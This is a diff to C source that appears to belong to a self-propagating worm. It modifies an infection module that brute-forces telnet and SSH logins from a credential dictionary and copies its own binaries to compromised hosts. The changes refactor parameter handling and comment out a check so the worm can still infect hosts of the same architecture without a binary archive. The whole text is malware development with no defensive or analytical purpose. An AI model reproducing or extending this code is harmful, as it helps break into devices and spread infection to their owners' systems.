@@ -1298,13 +1298,13 @@ static bool bne_sh_start_rcb (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 	ctx->result.prc = prne_start_bin_rcb_compat(
 		&sh_ctx->rcb,
 		ctx->result.arch,
-		ctx->param.rcb.self,
-		ctx->param.rcb.m_self,
-		ctx->param.rcb.self_len,
-		ctx->param.rcb.exec_len,
-		ctx->param.rcb.m_dv,
-		ctx->param.rcb.dv_len,
-		ctx->param.rcb.ba,
+		ctx->param.rcb->self,
+		ctx->param.rcb->m_self,
+		ctx->param.rcb->self_len,
+		ctx->param.rcb->exec_len,
+		ctx->param.rcb->m_dv,
+		ctx->param.rcb->dv_len,
+		ctx->param.rcb->ba,
 		&actual);
 
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
@@ -3217,7 +3217,6 @@ static void *bne_entry_f (void *p) {
 
 void prne_init_bne_param (prne_bne_param_t *p) {
 	prne_memzero(p, sizeof(prne_bne_param_t));
-	p->rcb.self = PRNE_ARCH_NONE;
 }
 
 void prne_free_bne_param (prne_bne_param_t *p) {}
@@ -3228,6 +3227,7 @@ const char *prne_bne_vector_tostr (const prne_bne_vector_t v) {
 	case PRNE_BNE_V_BRUTE_TELNET: return "telnet";
 	case PRNE_BNE_V_BRUTE_SSH: return "ssh";
 	}
+	errno = EINVAL;
 	return NULL;
 }
 
@@ -3241,7 +3241,10 @@ prne_bne_t *prne_alloc_bne (
 
 	if (ctr_drbg == NULL ||
 		param->cb.exec_name == NULL ||
-		param->rcb.ba == NULL ||
+		param->rcb == NULL ||
+		/* The instance will only be able to infect hosts with same arch without
+		bin archive. */
+		// param->rcb->ba == NULL ||
 		param->cred_dict->cnt == 0)
 	{
 		errno = EINVAL;
